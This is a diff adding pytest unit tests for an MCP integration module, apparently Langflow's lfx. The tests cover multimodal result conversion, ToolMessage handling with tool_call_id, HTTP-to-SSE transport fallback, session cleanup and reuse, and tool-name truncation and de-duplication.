+        from lfx.base.mcp.util import _convert_mcp_result
+
+        result = self._make_result(
+            [
+                self._make_text_block("first"),
+                self._make_text_block("second"),
+            ]
+        )
+        assert _convert_mcp_result(result) == "first\nsecond"
+
+    def test_should_convert_image_block_to_image_url_format(self):
+        """Image content must be converted to LangChain image_url format."""
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        # Arrange — reproduces the exact scenario from issue #11812
+        b64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwADhQGAWjR9awAAAABJRU5ErkJggg=="
+        result = self._make_result([self._make_image_block(data=b64, mime="image/png")])
+
+        # Act
+        converted = _convert_mcp_result(result)
+
+        # Assert — must be a list with a single image_url block
+        assert isinstance(converted, list)
+        assert len(converted) == 1
+        assert converted[0]["type"] == "image_url"
+        assert converted[0]["image_url"]["url"] == f"data:image/png;base64,{b64}"
+
+    def test_should_handle_mixed_text_and_image_blocks(self):
+        """Mixed text + image content must return a list preserving order."""
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        b64 = "abc123=="
+        result = self._make_result(
+            [
+                self._make_text_block("Here is the screenshot:"),
+                self._make_image_block(data=b64, mime="image/jpeg"),
+            ]
+        )
+
+        converted = _convert_mcp_result(result)
+
+        assert isinstance(converted, list)
+        assert len(converted) == 2
+        assert converted[0] == {"type": "text", "text": "Here is the screenshot:"}
+        assert converted[1] == {
+            "type": "image_url",
+            "image_url": {"url": f"data:image/jpeg;base64,{b64}"},
+        }
+
+    def test_should_default_mime_type_to_image_png_when_missing(self):
+        """Image block with no mimeType must default to image/png."""
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        block = MagicMock()
+        block.type = "image"
+        block.data = "xyz=="
+        block.mimeType = None  # missing MIME
+
+        result = self._make_result([block])
+        converted = _convert_mcp_result(result)
+
+        assert converted[0]["image_url"]["url"].startswith("data:image/png;base64,")
+
+    def test_should_handle_multiple_image_blocks(self):
+        """Multiple image blocks must all be converted."""
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        result = self._make_result(
+            [
+                self._make_image_block(data="img1==", mime="image/png"),
+                self._make_image_block(data="img2==", mime="image/jpeg"),
+            ]
+        )
+
+        converted = _convert_mcp_result(result)
+
+        assert len(converted) == 2
+        assert converted[0]["image_url"]["url"] == "data:image/png;base64,img1=="
+        assert converted[1]["image_url"]["url"] == "data:image/jpeg;base64,img2=="
+
+    def _make_resource_block(self, uri: str = "file:///data.csv", mime: str = "text/csv"):
+        block = MagicMock()
+        block.type = "resource"
+        block.model_dump.return_value = {"type": "resource", "uri": uri, "mimeType": mime}
+        return block
+
+    def test_should_serialise_resource_only_result_as_text_block(self):
+        """A resource-only result must not be dropped — serialised as JSON text block."""
+        import json
+
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        resource = self._make_resource_block()
+        result = self._make_result([resource])
+
+        converted = _convert_mcp_result(result)
+
+        assert isinstance(converted, list)
+        assert len(converted) == 1
+        assert converted[0]["type"] == "text"
+        parsed = json.loads(converted[0]["text"])
+        assert parsed["type"] == "resource"
+        assert "uri" in parsed
+
+    def test_should_preserve_all_blocks_in_mixed_image_and_resource_result(self):
+        """Mixed image + resource must produce a list with both blocks, nothing dropped."""
+        import json
+
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        b64 = "abc123=="
+        image = self._make_image_block(data=b64, mime="image/png")
+        resource = self._make_resource_block(uri="file:///chart.csv")
+        result = self._make_result([image, resource])
+
+        converted = _convert_mcp_result(result)
+
+        assert isinstance(converted, list)
+        assert len(converted) == 2
+
+        # First block: image
+        assert converted[0]["type"] == "image_url"
+        assert converted[0]["image_url"]["url"] == f"data:image/png;base64,{b64}"
+
+        # Second block: resource serialised as text
+        assert converted[1]["type"] == "text"
+        parsed = json.loads(converted[1]["text"])
+        assert parsed["type"] == "resource"
+        assert parsed["uri"] == "file:///chart.csv"
+
+    def test_should_handle_unknown_block_type_without_model_dump(self):
+        """Block without model_dump must still produce a text fallback, not raise."""
+        import json
+
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        block = MagicMock(spec=[])  # no model_dump attribute
+        block.type = "audio"
+
+        result = self._make_result([block])
+        converted = _convert_mcp_result(result)
+
+        assert isinstance(converted, list)
+        assert converted[0]["type"] == "text"
+        # Must be valid JSON
+        json.loads(converted[0]["text"])
+
+
+def test_mcp_structured_tool_annotations_resolve_in_util_namespace():
+    """Keep LangChain's inherited forward annotations resolvable for Pydantic."""
+    from langchain_core.tools import StructuredTool
+
+    annotation_proxy = type(
+        "MCPStructuredToolAnnotations",
+        (),
+        {"__annotations__": StructuredTool.__annotations__},
+    )
+
+    resolved = get_type_hints(
+        annotation_proxy,
+        globalns=vars(util),
+        localns=vars(util),
+        include_extras=True,
+    )
+
+    assert set(StructuredTool.__annotations__) <= set(resolved)
+
+
+class TestMCPStructuredToolToolCallId:
+    """Tests for the tool_call_id branching inside MCPStructuredTool.
+
+    Uses update_tools() with a mocked stdio client so the real MCPStructuredTool
+    class (defined inline in update_tools) is exercised instead of a local copy.
+
+    When tool_call_id is absent the tool must return the raw CallToolResult
+    (preserving backward compatibility for mcp_component and ToolInvoker).
+    When tool_call_id is present it must return a ToolMessage whose content
+    is multimodal-ready and whose artifact holds the original CallToolResult.
+    """
+
+    def _make_raw_result(self, text: str = "ok", image_data: str | None = None):
+        """Build a minimal CallToolResult-like mock."""
+        text_block = MagicMock()
+        text_block.type = "text"
+        text_block.text = text
+
+        content = [text_block]
+        if image_data:
+            img_block = MagicMock()
+            img_block.type = "image"
+            img_block.data = image_data
+            img_block.mimeType = "image/png"
+            content.append(img_block)
+
+        result = MagicMock()
+        result.isError = False
+        result.content = content
+        result.structuredContent = None
+        return result
+
+    async def _build_tool_via_update_tools(self, raw_result):
+        """Get a real MCPStructuredTool from update_tools() with a mocked client."""
+        mock_tool = MagicMock()
+        mock_tool.name = "get_image"
+        mock_tool.description = "Returns content"
+        mock_tool.inputSchema = {"type": "object", "properties": {}, "required": []}
+        mock_tool.outputSchema = None
+
+        mock_client = AsyncMock(spec=MCPStdioClient)
+        mock_client.connect_to_server = AsyncMock(return_value=[mock_tool])
+        mock_client.run_tool = AsyncMock(return_value=raw_result)
+        mock_client._connected = True
+
+        server_config = {"command": "uvx"}
+        _, tools, _ = await update_tools("test-server", server_config, mcp_stdio_client=mock_client)
+        assert tools, "update_tools() must return at least one tool"
+        return tools[0]
+
+    @pytest.mark.asyncio
+    async def test_no_tool_call_id_returns_raw_result(self):
+        """Without tool_call_id the raw CallToolResult must be returned (mcp_component compat)."""
+        raw = self._make_raw_result(text="hello")
+        tool = await self._build_tool_via_update_tools(raw)
+
+        result = await tool.arun({})
+
+        assert result is raw
+
+    @pytest.mark.asyncio
+    async def test_with_tool_call_id_returns_tool_message(self):
+        """With tool_call_id the result must be a ToolMessage."""
+        from langchain_core.messages import ToolMessage
+
+        raw = self._make_raw_result(text="hello")
+        tool = await self._build_tool_via_update_tools(raw)
+
+        result = await tool.arun({}, tool_call_id="call-abc-123")
+
+        assert isinstance(result, ToolMessage)
+        assert result.name == "get_image"
+        assert result.tool_call_id == "call-abc-123"
+
+    @pytest.mark.asyncio
+    async def test_tool_message_artifact_holds_raw_call_tool_result(self):
+        """The artifact on the returned ToolMessage must be the original raw result."""
+        from langchain_core.messages import ToolMessage
+
+        raw = self._make_raw_result(text="hello")
+        tool = await self._build_tool_via_update_tools(raw)
+
+        result = await tool.arun({}, tool_call_id="call-abc-123")
+
+        assert isinstance(result, ToolMessage)
+        assert result.artifact is raw
+
+    @pytest.mark.asyncio
+    async def test_image_content_converted_in_tool_message(self):
+        """Image blocks must appear as image_url inside the ToolMessage content."""
+        from langchain_core.messages import ToolMessage
+
+        b64 = "abc123=="
+        raw = self._make_raw_result(image_data=b64)
+        tool = await self._build_tool_via_update_tools(raw)
+
+        result = await tool.arun({}, tool_call_id="call-img-001")
+
+        assert isinstance(result, ToolMessage)
+        content = result.content
+        assert isinstance(content, list)
+        image_blocks = [b for b in content if b.get("type") == "image_url"]
+        assert len(image_blocks) == 1
+        assert image_blocks[0]["image_url"]["url"] == f"data:image/png;base64,{b64}"
+
+    @pytest.mark.asyncio
+    async def test_tool_call_id_is_preserved_for_callbacks(self):
+        """Callbacks must still see tool_call_id and the formatted ToolMessage output."""
+        from langchain_core.callbacks.base import AsyncCallbackHandler
+        from langchain_core.messages import ToolMessage
+
+        class RecordingHandler(AsyncCallbackHandler):
+            def __init__(self):
+                self.tool_call_ids = []
+                self.outputs = []
+
+            async def on_tool_start(
+                self,
+                serialized,
+                input_str,
+                *,
+                run_id,
+                parent_run_id=None,
+                tags=None,
+                metadata=None,
+                inputs=None,
+                **kwargs,
+            ):
+                _ = (serialized, input_str, run_id, parent_run_id, tags, metadata, inputs)
+                self.tool_call_ids.append(kwargs.get("tool_call_id"))
+
+            async def on_tool_end(self, output, *, run_id, parent_run_id=None, **kwargs):
+                _ = (run_id, parent_run_id, kwargs)
+                self.outputs.append(output)
+
+        raw = self._make_raw_result(image_data="abc123==")
+        tool = await self._build_tool_via_update_tools(raw)
+        handler = RecordingHandler()
+
+        result = await tool.arun({}, tool_call_id="call-img-001", callbacks=[handler])
+
+        assert handler.tool_call_ids == ["call-img-001"]
+        assert len(handler.outputs) == 1
+        assert isinstance(handler.outputs[0], ToolMessage)
+        assert handler.outputs[0].name == "get_image"
+        assert handler.outputs[0].artifact is raw
+        assert result.name == "get_image"
+
+
+class TestStreamableHttpTransportPolicy:
+    """Mocked streamable HTTP vs SSE: reconnect policy and fallback classification."""
+
+    def _connection_params(self):
+        return {
+            "url": "http://test-mcp.example/mcp",
+            "headers": {},
+            "timeout_seconds": 30,
+            "verify_ssl": True,
+        }
+
+    def _fake_client_session(self):
+        inst = MagicMock()
+        inst.initialize = AsyncMock()
+        inst.__aenter__ = AsyncMock(return_value=inst)
+        inst.__aexit__ = AsyncMock(return_value=None)
+        return inst
+
+    @pytest.mark.asyncio
+    async def test_streamable_success_sse_not_invoked(self):
+        manager = MCPSessionManager()
+        try:
+            fake = self._fake_client_session()
+            stream_cm = MagicMock()
+            stream_cm.return_value.__aenter__ = AsyncMock(return_value=(MagicMock(), MagicMock(), None))
+            stream_cm.return_value.__aexit__ = AsyncMock(return_value=None)
+            with (
+                patch("lfx.base.mcp.util.ClientSession", return_value=fake),
+                patch("mcp.client.streamable_http.streamablehttp_client", stream_cm),
+                patch("mcp.client.sse.sse_client") as sse_cm,
+            ):
+                session, task, transport, sse_lock = await manager._create_streamable_http_session(
+                    "test_sess", self._connection_params(), None
+                )
+                assert transport == "streamable_http"
+                assert sse_lock is False
+                assert session is fake
+                sse_cm.assert_not_called()
+            task.cancel()
+            with suppress(asyncio.CancelledError):
+                await task
+        finally:
+            await manager.cleanup_all()
+
+    @pytest.mark.asyncio
+    async def test_transient_streamable_failure_no_sse_fallback(self):
+        manager = MCPSessionManager()
+        try:
+            fake = self._fake_client_session()
+            stream_cm = MagicMock()
+            stream_cm.return_value.__aenter__ = AsyncMock(side_effect=ConnectionError("connection refused"))
+            stream_cm.return_value.__aexit__ = AsyncMock(return_value=None)
+            with (
+                patch("lfx.base.mcp.util.ClientSession", return_value=fake),
+                patch("mcp.client.streamable_http.streamablehttp_client", stream_cm),
+                patch("mcp.client.sse.sse_client") as sse_cm,
+            ):
+                with pytest.raises(ConnectionError, match="connection refused"):
+                    await manager._create_streamable_http_session("test_sess", self._connection_params(), None)
+                sse_cm.assert_not_called()
+        finally:
+            await manager.cleanup_all()
+
+    @pytest.mark.asyncio
+    async def test_streamable_404_triggers_sse(self):
+        manager = MCPSessionManager()
+        try:
+            req = httpx.Request("GET", "http://test-mcp.example/mcp")
+            resp = httpx.Response(404, request=req)
+            err404 = httpx.HTTPStatusError("not found", request=req, response=resp)
+            fake_stream = self._fake_client_session()
+            fake_sse = self._fake_client_session()
+            sessions = iter([fake_stream, fake_sse])
+
+            def client_session_factory(_r, _w, *_args):
+                return next(sessions)
+
+            stream_cm = MagicMock()
+            stream_cm.return_value.__aenter__ = AsyncMock(side_effect=err404)
+            stream_cm.return_value.__aexit__ = AsyncMock(return_value=None)
+            sse_cm = MagicMock()
+            sse_cm.return_value.__aenter__ = AsyncMock(return_value=(MagicMock(), MagicMock()))
+            sse_cm.return_value.__aexit__ = AsyncMock(return_value=None)
+            with (
+                patch("lfx.base.mcp.util.ClientSession", side_effect=client_session_factory),
+                patch("mcp.client.streamable_http.streamablehttp_client", stream_cm),
+                patch("mcp.client.sse.sse_client", sse_cm),
+            ):
+                _session, task, transport, sse_lock = await manager._create_streamable_http_session(
+                    "test_sess", self._connection_params(), None
+                )
+                assert transport == "sse"
+                assert sse_lock is True
+                sse_cm.assert_called_once()
+            task.cancel()
+            with suppress(asyncio.CancelledError):
+                await task
+        finally:
+            await manager.cleanup_all()
+
+    @pytest.mark.asyncio
+    async def test_validate_connectivity_mcp_session_terminated_returns_false(self):
+        manager = MCPSessionManager()
+        try:
+            mock_session = AsyncMock()
+            mock_session.list_tools = AsyncMock(side_effect=RuntimeError("Session terminated"))
+            assert await manager._validate_session_connectivity(mock_session) is False
+        finally:
+            await manager.cleanup_all()
+
+    def test_classify_transient_includes_connection_and_taskgroup_hints(self):
+        assert _is_transient_streamable_http_error(ConnectionError("x")) is True
+        assert _is_transient_streamable_http_error(RuntimeError("unhandled errors in a TaskGroup")) is True
+        req = httpx.Request("GET", "http://x")
+        resp_404 = httpx.Response(404, request=req)
+        assert _is_transient_streamable_http_error(httpx.HTTPStatusError("x", request=req, response=resp_404)) is False
+
+    def test_sse_fallback_after_404(self):
+        req = httpx.Request("GET", "http://x")
+        resp_404 = httpx.Response(404, request=req)
+        e = httpx.HTTPStatusError("x", request=req, response=resp_404)
+        assert _should_attempt_sse_after_streamable_failure(e) is True
+        assert _should_attempt_sse_after_streamable_failure(ConnectionError("x")) is False
+
+
+# ---------------------------------------------------------------------------
+# Regression tests for the CPU-spin / workflow-hang fix
+# ---------------------------------------------------------------------------
+
+
+class TestCleanupIntervalFloorGuard:
+    """get_session_cleanup_interval() must never return a value below the minimum.
+
+    If the cleanup loop sleeps(0) it spins at 100% CPU and locks the machine.
+    """
+
+    def _get_interval(self):
+        from lfx.base.mcp.util import get_session_cleanup_interval
+
+        return get_session_cleanup_interval
+
+    def test_returns_configured_value_when_above_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=120):
+            assert get_session_cleanup_interval() == 120
+
+    def test_clamps_zero_to_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=0):
+            result = get_session_cleanup_interval()
+            assert result >= 30
+
+    def test_clamps_none_to_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=None):
+            result = get_session_cleanup_interval()
+            assert result >= 30
+
+    def test_clamps_negative_to_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=-1):
+            result = get_session_cleanup_interval()
+            assert result >= 30
+
+    def test_clamps_value_below_minimum_to_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=5):
+            result = get_session_cleanup_interval()
+            assert result >= 30
+
+
+class TestCleanupTaskStartup:
+    """The cleanup task must tolerate sync construction and start on first async use."""
+
+    def test_constructor_without_running_loop_defers_cleanup_task(self):
+        manager = MCPSessionManager()
+
+        assert manager._cleanup_task is None
+
+    async def test_get_session_starts_deferred_cleanup_task(self):
+        manager = MCPSessionManager()
+        await manager.cleanup_all()
+        manager._cleanup_task = None
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+        mock_session = AsyncMock()
+        mock_task = MagicMock()
+        mock_task.done.return_value = False
+
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            return mock_session, mock_task, "streamable_http", False
+
+        try:
+            with patch.object(manager, "_create_streamable_http_session", side_effect=fake_create):
+                await manager.get_session("ctx_1", connection_params, "streamable_http")
+
+            assert manager._cleanup_task is not None
+            assert not manager._cleanup_task.done()
+        finally:
+            await manager.cleanup_all()
+
+
+class TestGetSessionNoBlockingHealthCheck:
+    """get_session() must NOT call list_tools() on the hot path.
+
+    Before the fix, every get_session() called _validate_session_connectivity()
+    which did a list_tools() RPC (~3 s timeout). With 10 sessions that added
+    ~30 s of blocking to every single tool invocation.
+    """
+
+    @pytest.fixture
+    def manager(self):
+        return MCPSessionManager()
+
+    async def test_reuses_live_session_without_calling_list_tools(self, manager):
+        """A session whose background task is running must be reused immediately.
+
+        Without any list_tools() call.
+        """
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+        mock_session = AsyncMock()
+        mock_task = AsyncMock()
+        mock_task.done = MagicMock(return_value=False)
+        mock_task.cancel = MagicMock()
+
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            return mock_session, mock_task, "streamable_http", False
+
+        try:
+            with patch.object(manager, "_create_streamable_http_session", side_effect=fake_create):
+                # First call creates the session.
+                s1 = await manager.get_session("ctx_1", connection_params, "streamable_http")
+                # Second call must reuse it — list_tools must never be called.
+                with patch.object(manager, "_validate_session_connectivity") as mock_validate:
+                    s2 = await manager.get_session("ctx_2", connection_params, "streamable_http")
+                    mock_validate.assert_not_called()
+            assert s1 is mock_session
+            assert s2 is mock_session
+            mock_session.list_tools.assert_not_awaited()
+        finally:
+            await manager.cleanup_all()
+
+    async def test_dead_task_triggers_new_session_without_list_tools(self, manager):
+        """A session whose background task is done must be cleaned up and replaced.
+
+        Again without any list_tools() call.
+        """
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+        mock_session_1 = AsyncMock()
+        mock_task_1 = AsyncMock()
+        mock_task_1.done = MagicMock(return_value=True)  # already dead
+        mock_task_1.cancel = MagicMock()
+
+        mock_session_2 = AsyncMock()
+        mock_task_2 = AsyncMock()
+        mock_task_2.done = MagicMock(return_value=False)
+        mock_task_2.cancel = MagicMock()
+
+        # The dead session is seeded directly, so fake_create is only called
+        # once — to produce the replacement session (mock_session_2).
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            return mock_session_2, mock_task_2, "streamable_http", False
+
+        try:
+            with patch.object(manager, "_create_streamable_http_session", side_effect=fake_create):
+                # Seed the dead session directly.
+                server_key = manager._get_server_key(connection_params, "streamable_http")
+                manager.sessions_by_server[server_key] = {
+                    "sessions": {
+                        f"{server_key}_0": {
+                            "session": mock_session_1,
+                            "task": mock_task_1,
+                            "type": "streamable_http",
+                            "last_used": 0,
+                        }
+                    },
+                    "last_cleanup": 0,
+                }
+                manager._session_id_counters[server_key] = 1
+
+                with patch.object(manager, "_validate_session_connectivity") as mock_validate:
+                    result = await manager.get_session("ctx_new", connection_params, "streamable_http")
+                    mock_validate.assert_not_called()
+
+            assert result is mock_session_2
+        finally:
+            await manager.cleanup_all()
+
+
+class TestSettingsCacheNotStale:
+    """_get_mcp_setting() must read live from the settings service, not a cache.
+
+    The old code used a module-level _mcp_settings_cache dict.  If settings
+    changed after startup (hot-reload, test fixture tear-down) the cached value
+    would be used forever, masking bugs and causing hard-to-reproduce failures.
+    """
+
+    def test_reads_live_value_on_each_call(self):
+        """Two consecutive calls must reflect the current settings value.
+
+        Not a value cached from a previous call.
+        """
+        call_count = 0
+        values = [10, 20]
+
+        class FakeSettings:
+            @property
+            def mcp_session_cleanup_interval(self):
+                nonlocal call_count
+                v = values[min(call_count, len(values) - 1)]
+                call_count += 1
+                return v
+
+        fake_service = MagicMock()
+        fake_service.settings = FakeSettings()
+
+        with patch.object(util, "get_settings_service", return_value=fake_service):
+            first = util._get_mcp_setting("mcp_session_cleanup_interval")
+            second = util._get_mcp_setting("mcp_session_cleanup_interval")
+
+        assert first == 10
+        assert second == 20
+
+
+class TestPeriodicCleanupSurvivesUnexpectedError:
+    """_periodic_cleanup() must keep running even if an unexpected exception fires.
+
+    The old narrow ``except (RuntimeError, KeyError, ...)`` clause would let
+    other exceptions propagate, silently killing the cleanup task forever.
+    Sessions would then never be reaped until the process was restarted.
+    """
+
+    async def test_cleanup_loop_continues_after_unexpected_exception(self):
+        """An unexpected exception inside cleanup must be swallowed.
+
+        The loop must keep sleeping and retrying.
+        """
+        manager = MCPSessionManager()
+        iterations: list[int] = []
+        stop = asyncio.Event()
+
+        async def fake_cleanup_idle():
+            iterations.append(1)
+            if len(iterations) == 1:
+                msg = "unexpected error from cleanup"
+                raise TypeError(msg)
+            if len(iterations) >= 2:
+                stop.set()
+
+        try:
+            with (
+                patch.object(manager, "_cleanup_idle_sessions", side_effect=fake_cleanup_idle),
+                patch.object(util, "get_session_cleanup_interval", return_value=0.01),
+            ):
+                task = asyncio.create_task(manager._periodic_cleanup())
+                await asyncio.wait_for(stop.wait(), timeout=2.0)
+                task.cancel()
+                with suppress(asyncio.CancelledError):
+                    await task
+
+            # Both iterations ran — the loop survived the first exception.
+            assert len(iterations) >= 2
+        finally:
+            await manager.cleanup_all()
+
+
+class _NameFlow:
+    """The fields the MCP tool name is derived from."""
+
+    def __init__(self, name: str, flow_id: str, *, action_name: str | None = None):
+        self.name = name
+        self.id = flow_id
+        self.user_id = "123e4567-e89b-12d3-a456-426614174000"
+        self.is_component = False
+        self.action_name = action_name
+
+
+class _NameSession:
+    """A session whose ``exec`` answers with a fixed flow list."""
+
+    def __init__(self, flows):
+        self._flows = flows
+
+    async def exec(self, stmt):  # noqa: ARG002
+        class _Result:
+            def __init__(self, flows):
+                self._flows = flows
+
+            def all(self):
+                return self._flows
+
+        return _Result(self._flows)
+
+
+def _publish(flows, *, is_action: bool = False) -> dict[str, str]:
+    """Reproduce the names ``handle_list_tools`` puts on the wire, id by name.
+
+    Kept as a local copy of the publishing rule on purpose: these cells grade the
+    call path against what the list path emits, so deriving both from the same
+    helper would make them pass by construction and prove nothing.
+    """
+    published: dict[str, str] = {}
+    for flow in flows:
+        base_name = (
+            util.sanitize_mcp_name(flow.action_name)
+            if is_action and flow.action_name
+            else util.sanitize_mcp_name(flow.name)
+        )
+        published[util.get_unique_name(base_name, MAX_MCP_TOOL_NAME_LENGTH, set(published))] = flow.id
+    return published
+
+
+class TestMCPToolNameResolution:
+    """A name the server publishes has to be a name the server accepts.
+
+    ``tools/list`` and ``tools/call`` are joined by the tool name and nothing
+    else: the client stores the string it was given and sends it back. Every
+    cell here calls a name that the list path really published.
+    """
+
+    USER_ID = "123e4567-e89b-12d3-a456-426614174000"
+    LONG_NAME = "Portfolio Website Code Generator"  # 32 chars: a Langflow starter template
+
+    @pytest.mark.asyncio
+    async def test_a_name_longer_than_the_limit_resolves(self):
+        flows = [_NameFlow(self.LONG_NAME, "flow-1")]
+        published = _publish(flows)
+        (name,) = published
+
+        assert len(name) == MAX_MCP_TOOL_NAME_LENGTH
+        result = await util.get_flow_snake_case(name, self.USER_ID, _NameSession(flows))
+
+        assert result is not None, f"the server published {name!r} and then refused it"
+        assert result.id == "flow-1"
+
+    @pytest.mark.asyncio
+    async def test_a_de_duplicated_name_resolves(self):
+        flows = [_NameFlow(self.LONG_NAME, "flow-1"), _NameFlow(self.LONG_NAME, "flow-2")]
+        published = _publish(flows)
+
+        for name, flow_id in published.items():
+            result = await util.get_flow_snake_case(name, self.USER_ID, _NameSession(flows))
+            assert result is not None, f"the server published {name!r} and then refused it"
+            assert result.id == flow_id
+
+    @pytest.mark.asyncio
+    async def test_a_truncated_name_does_not_resolve_to_another_flow(self):
+        """The quiet half: one flow's tool running another flow's graph.
+
+        A 32-char name is published truncated to 30. A second flow named exactly
+        those 30 chars is published with the ``_1`` suffix, so the bare name now
+        belongs to the first flow while the call path regenerates it from the
+        second and answers with it. Nothing raises.
+        """
+        flows = [_NameFlow(self.LONG_NAME, "flow-1"), _NameFlow(self.LONG_NAME[:30], "flow-2")]
+        published = _publish(flows)
+
+        for name, flow_id in published.items():
+            result = await util.get_flow_snake_case(name, self.USER_ID, _NameSession(flows))
+            assert result is not None, f"the server published {name!r} and then refused it"
+            assert result.id == flow_id, f"{name!r} ran {result.id}, which is not the flow it was published for"
+
+    @pytest.mark.asyncio
+    async def test_a_long_action_name_resolves(self):
+        flows = [_NameFlow("Short", "flow-1", action_name=self.LONG_NAME)]
+        published = _publish(flows, is_action=True)
+        (name,) = published
+
+        result = await util.get_flow_snake_case(name, self.USER_ID, _NameSession(flows), is_action=True)
+
+        assert result is not None, f"the server published {name!r} and then refused it"
+        assert result.id == "flow-1"
+
+
+class TestBuildMcpToolNameMap:
+    """The helper both MCP halves derive their names from."""
+
+    LONG_NAME = "Portfolio Website Code Generator"  # 32 chars
+
+    def test_truncates_to_the_published_limit(self):
+        name_map = util.build_mcp_tool_name_map([_NameFlow(self.LONG_NAME, "flow-1")])
+
+        assert list(name_map) == ["portfolio_website_code_generat"]
+
+    def test_de_duplicates_in_the_order_the_flows_arrive(self):
+        first = _NameFlow(self.LONG_NAME, "flow-1")
+        second = _NameFlow(self.LONG_NAME, "flow-2")
+
+        assert util.build_mcp_tool_name_map([first, second]) == {
+            "portfolio_website_code_generat": first,
+            "portfolio_website_code_gener_1": second,
+        }
+        # Reversed input, reversed suffix: both call sites order by Flow.id so that
+        # which flow holds the bare name cannot flip between a list and a call.
+        assert util.build_mcp_tool_name_map([second, first]) == {
+            "portfolio_website_code_generat": second,
+            "portfolio_website_code_gener_1": first,
+        }
+
+    def test_action_name_is_used_only_on_the_project_surface(self):
+        flow = _NameFlow("Some Flow", "flow-1", action_name="Renamed Action")
+
+        assert list(util.build_mcp_tool_name_map([flow], is_action=True)) == ["renamed_action"]
+        assert list(util.build_mcp_tool_name_map([flow])) == ["some_flow"]
+
+    def test_an_empty_action_name_falls_back_to_the_flow_name(self):
+        flow = _NameFlow("Some Flow", "flow-1", action_name=None)
+
+        assert list(util.build_mcp_tool_name_map([flow], is_action=True)) == ["some_flow"]
